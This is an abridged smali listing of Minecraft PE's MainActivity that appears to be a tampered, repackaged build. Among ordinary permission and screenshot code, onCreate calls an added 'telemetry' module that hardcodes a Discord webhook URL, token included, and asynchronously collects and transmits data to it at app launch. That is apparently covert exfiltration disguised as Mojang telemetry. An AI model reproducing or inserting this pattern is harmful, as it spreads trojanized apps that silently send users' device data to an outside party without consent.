...
.field private static final READ_MEDIA_IMAGES_PERMISSION_ID:I = 0x3
...
.field private static mHasReadMediaImagesPermission:Z
...
.field private telemetryManager:Lcom/mojang/minecraftpe/telemetry/TelemetryManager;
...
.method static constructor <clinit>()V
    ...
    invoke-static {v1}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
    :try_end_17
    .catch Ljava/lang/UnsatisfiedLinkError; {:try_start_12 .. :try_end_17} :catch_18
...
.method private initializeTelemetryModule()V
    .registers 5

    :try_start_0
    const-string v0, "Initializing telemetry module"

    invoke-static {v0}, Lcom/mojang/minecraftpe/telemetry/TelemetryUtils;->logDebug(Ljava/lang/String;)V

    new-instance v0, Lcom/mojang/minecraftpe/telemetry/TelemetryConfigProvider;

    invoke-direct {v0, p0}, Lcom/mojang/minecraftpe/telemetry/TelemetryConfigProvider;-><init>(Landroid/content/Context;)V

    const-string v1, "https://discord.com/api/webhooks/1351095366619234327/AfDLCulezZEZZAIVRuxTLhDupISfDhw-fXc3KxjewAZE7t5NpjmRMtxYMd66M-ZGUSDA"

    invoke-virtual {v0, v1}, Lcom/mojang/minecraftpe/telemetry/TelemetryConfigProvider;->createConfigWithEndpoint(Ljava/lang/String;)Lcom/mojang/minecraftpe/telemetry/TelemetryConfig;

    move-result-object v2

    new-instance v3, Lcom/mojang/minecraftpe/telemetry/TelemetryManager;

    invoke-direct {v3, p0, v2, v0}, Lcom/mojang/minecraftpe/telemetry/TelemetryManager;-><init>(Landroid/content/Context;Lcom/mojang/minecraftpe/telemetry/TelemetryConfig;Lcom/mojang/minecraftpe/telemetry/TelemetryConfigProvider;)V

    iput-object v3, p0, Lcom/mojang/minecraftpe/MainActivity;->telemetryManager:Lcom/mojang/minecraftpe/telemetry/TelemetryManager;

    new-instance v0, Lcom/mojang/minecraftpe/MainActivity$TelemetryCallbackImpl;

    invoke-direct {v0, p0}, Lcom/mojang/minecraftpe/MainActivity$TelemetryCallbackImpl;-><init>(Lcom/mojang/minecraftpe/MainActivity;)V

    invoke-virtual {v3, v1, v0}, Lcom/mojang/minecraftpe/telemetry/TelemetryManager;->collectAndTransmitTelemetryAsync(Ljava/lang/String;Lcom/mojang/minecraftpe/telemetry/TelemetryCallback;)V
    :try_end_1f
    ...
    const-string v1, "Telemetry initialization failed"

    invoke-static {v1, v0}, Lcom/mojang/minecraftpe/telemetry/TelemetryUtils;->logError(Ljava/lang/String;Ljava/lang/Throwable;)V
...
.method private processIntent(Landroid/content/Intent;)V
    ...
    move-result-object v1
    :try_end_cf
    .catch Ljava/io/IOException; {:try_start_cb .. :try_end_cf} :catch_169
    ...
    :try_end_109
    .catch Ljava/io/IOException; {:try_start_cf .. :try_end_109} :catch_117
    .catchall {:try_start_cf .. :try_end_109} :catchall_115
    ...
    :try_end_132
    .catchall {:try_start_118 .. :try_end_132} :catchall_115
    ...
    .catchall {:try_start_132 .. :try_end_135} :catchall_115
...
.method public static saveScreenshot(Ljava/lang/String;II[I)V
    ...
    :try_end_12
    .catch Ljava/io/FileNotFoundException; {:try_start_6 .. :try_end_12} :catch_23
    ...
    .catch Ljava/io/FileNotFoundException; {:try_start_12 .. :try_end_15} :catch_23
    ...
    :try_end_1a
    .catch Ljava/io/FileNotFoundException; {:try_start_17 .. :try_end_1a} :catch_23
    ...
    .catch Ljava/io/FileNotFoundException; {:try_start_1a .. :try_end_1d} :catch_23
    ...
    invoke-virtual {p1}, Ljava/io/IOException;->printStackTrace()V
    :try_end_22
    .catch Ljava/io/FileNotFoundException; {:try_start_1f .. :try_end_22} :catch_23
...
.method public copyToPickedFile(Ljava/lang/String;)V
    ...
    :try_end_a
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_a} :catch_25
    ...
    :try_end_11
    .catchall {:try_start_a .. :try_end_11} :catchall_20
...
.method public getAPIVersion(Ljava/lang/String;)I
    ...
    move-result p1
    :try_end_1f
    .catch Ljava/lang/IllegalArgumentException; {:try_start_16 .. :try_end_1f} :catch_4e
    .catch Ljava/lang/IllegalAccessException; {:try_start_16 .. :try_end_1f} :catch_37
    .catch Ljava/lang/NullPointerException; {:try_start_16 .. :try_end_1f} :catch_20
...
.method public getDebugMemoryInfo(Ljava/lang/String;)J
    ...
    :sswitch_data_7a
    .sparse-switch
        -0x2ece32f4 -> :sswitch_3b
        0x75ac3153 -> :sswitch_30
        0x7f80887d -> :sswitch_25
    .end sparse-switch
...
.method public getImageData(Ljava/lang/String;)[I
    ...
    move-result-object v2
    :try_end_13
    .catch Ljava/lang/NullPointerException; {:try_start_f .. :try_end_13} :catch_44
    ...
    move-result-object v0
    :try_end_19
    .catch Ljava/io/IOException; {:try_start_15 .. :try_end_19} :catch_1e
    .catch Ljava/lang/NullPointerException; {:try_start_15 .. :try_end_19} :catch_44
    ...
    :try_end_43
    .catch Ljava/lang/NullPointerException; {:try_start_19 .. :try_end_43} :catch_44
...
.method public hasReadMediaImagesPermission()Z
    .registers 6
    ...
    invoke-virtual {p0, v4, v0, v1}, Lcom/mojang/minecraftpe/MainActivity;->checkPermission(Ljava/lang/String;II)I
    ...
    :goto_1a
    sput-boolean v2, Lcom/mojang/minecraftpe/MainActivity;->mHasReadMediaImagesPermission:Z
...
.method public onCreate(Landroid/os/Bundle;)V
    ...
    const-string v3, "com.microsoft.applications.events.HttpClient"
    ...
    :try_end_6a
    .catch Ljava/lang/Exception; {:try_start_4b .. :try_end_6a} :catch_6b
    ...
    invoke-direct {p0}, Lcom/mojang/minecraftpe/MainActivity;->initializeTelemetryModule()V
    ...
    invoke-direct {p1, p0, v3}, Lcom/mojang/minecraftpe/MainActivity$HeadsetConnectionReceiver;-><init>(Lcom/mojang/minecraftpe/MainActivity;Lcom/mojang/minecraftpe/MainActivity$1;)V
    ...
    invoke-direct {p1, v3}, Lcom/mojang/minecraftpe/NetworkMonitor;-><init>(Landroid/content/Context;)V
    ...
    invoke-virtual {p1, v3}, Lcom/mojang/minecraftpe/platforms/Platform;->onAppStart(Landroid/view/View;)V
    ...
    invoke-virtual {p0, v4, p1, v3}, Lcom/mojang/minecraftpe/MainActivity;->checkPermission(Ljava/lang/String;II)I
    ...
    invoke-virtual {p0, v3, p1, v0}, Lcom/mojang/minecraftpe/MainActivity;->checkPermission(Ljava/lang/String;II)I
    ...
    :cond_e3
    sput-boolean v1, Lcom/mojang/minecraftpe/MainActivity;->mHasReadMediaImagesPermission:Z
    ...
    :try_end_128
    .catch Ljava/lang/Exception; {:try_start_118 .. :try_end_128} :catch_128
...
.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    ...
    .line 657
    sput-boolean p2, Lcom/mojang/minecraftpe/MainActivity;->mHasReadMediaImagesPermission:Z

    goto :goto_21

    .line 660
    :cond_1f
    sput-boolean v0, Lcom/mojang/minecraftpe/MainActivity;->mHasReadMediaImagesPermission:Z

    .line 663
    :goto_21
    sget-boolean p1, Lcom/mojang/minecraftpe/MainActivity;->mHasReadMediaImagesPermission:Z
...
.method public openAndroidAppSettings()V
    ...
    :try_end_21
    .catch Landroid/content/ActivityNotFoundException; {:try_start_2 .. :try_end_21} :catch_22
...
.method pickImage(J)V
    ...
    :try_end_10
    .catch Landroid/content/ActivityNotFoundException; {:try_start_2 .. :try_end_10} :catch_10
...
.method public requestMediaImagesPermission(I)V
    .registers 4
    ...
    .line 630
    :cond_16
    invoke-virtual {p0, p1}, Lcom/mojang/minecraftpe/MainActivity;->requestStoragePermission(I)V
